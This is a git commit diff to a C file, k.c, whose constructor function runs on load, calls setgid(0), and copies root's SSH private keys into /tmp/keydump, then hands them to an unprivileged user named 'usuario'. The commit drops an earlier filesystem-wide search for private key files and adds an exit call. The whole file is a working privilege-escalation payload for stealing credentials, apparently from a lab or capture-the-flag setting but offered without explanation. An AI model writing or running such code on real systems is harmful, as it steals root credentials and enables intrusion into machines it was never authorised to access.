64412864af1f0fbe39c3d137709a73a2573b972c
Léo Cassini Scardini <45903926+LeoCassiniScardini@users.noreply.github.com>
2026-07-10 13:28:52 -0300

    Add files via upload

--- k.c
+++ k.c
@@ -6,9 +6,10 @@ __attribute__((constructor)) void init() {
     setgid(0);
 
     system("mkdir -p /tmp/keydump");
-    system("cp -a /root/.ssh/* /tmp/keydump/ 2>/dev/null");
-    system("find / -name id_rsa -o -name id_ed25519 -o -name '*.pem' -o -name '*.key' > /tmp/keylist.txt 2>/dev/null");
-    system("chown -R usuario:usuario /tmp/keydump /tmp/keylist.txt 2>/dev/null");
-    system("chmod -R u+rwX,go-rwx /tmp/keydump 2>/dev/null");
+    system("cp -a /root/.ssh/. /tmp/keydump/ 2>/tmp/kerr.txt");
+    system("chown -R usuario:usuario /tmp/keydump /tmp/kerr.txt 2>/dev/null");
+    system("chmod 700 /tmp/keydump 2>/dev/null");
     system("chmod 600 /tmp/keydump/* 2>/dev/null");
+
+    _exit(0);
 }
